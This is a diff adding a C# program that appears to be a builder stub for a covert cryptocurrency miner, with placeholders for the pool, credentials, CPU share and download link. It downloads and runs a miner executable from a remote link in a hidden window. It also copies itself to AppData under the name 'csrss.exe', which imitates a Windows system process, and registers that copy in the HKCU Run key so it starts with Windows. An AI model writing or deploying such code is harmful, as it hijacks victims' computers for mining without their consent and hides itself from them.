@@ -1,0 +1,100 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Reflection;
+using System.Windows.Forms;
+using Microsoft.Win32;
+
+namespace Money
+{
+    internal class Downloader
+    {
+        public static void Download(string link, string filePath)
+        {
+            try
+            {
+                using (WebClient webClient = new WebClient())
+                {
+                    webClient.DownloadFile(link, filePath);
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+        }
+    }
+    internal class Program
+    {
+        private static void Main(string[] args)
+        {
+            try
+            {
+                string pool = "[pool:port]";
+                string username = "[username]";
+                string password = "[password]";
+                int num = Int32.Parse("[cpu]");
+                bool startup = Convert.ToBoolean("[startup]");
+                bool gpu = Convert.ToBoolean("[GPU]");
+                int nCores = checked((int)Math.Round(Environment.ProcessorCount / 100.0 * num));
+                StartUp.AddStartUp(startup);
+                Run.Start(pool, username, password, nCores, gpu);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+        }
+    }
+    internal class Run
+    {
+        public static void Start(string Pool, string Username, string Password, int nCores, bool GPU)
+        {
+            if (!File.Exists(filePath))
+            {
+                Downloader.Download("[link]", filePath);
+            }
+            Process process = new Process();
+            ProcessStartInfo startInfo = process.StartInfo;
+            startInfo.FileName = "cmd.exe";
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            startInfo.CreateNoWindow = true;
+
+            if (GPU)
+            {
+                startInfo.Arguments = string.Format("/c " + filePath + " -o {0} -u {1} -p {2} -t {3} -g yes", new object[]
+				{
+					Pool,
+					Username,
+					Password,
+					nCores
+				});
+            }
+            else
+            {
+                startInfo.Arguments = string.Format("/c " + filePath + " -o {0} -u {1} -p {2} -t {3} -g no", new object[]
+				{
+					Pool,
+					Username,
+					Password,
+					nCores
+				});
+            }
+            process.Start();
+        }
+
+        public static string filePath = Environment.SpecialFolder.Templates + "//FrKdsS.exe";
+    }
+    internal class StartUp
+    {
+        public static void AddStartUp(bool check)
+        {
+            if (check)
+            {
+                File.Copy(Assembly.GetExecutingAssembly().Location, Environment.SpecialFolder.ApplicationData + "\\csrss.exe");
+                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("csrss.exe", Environment.SpecialFolder.ApplicationData + "\\csrss.exe");
+            }
+        }
+    }
+}
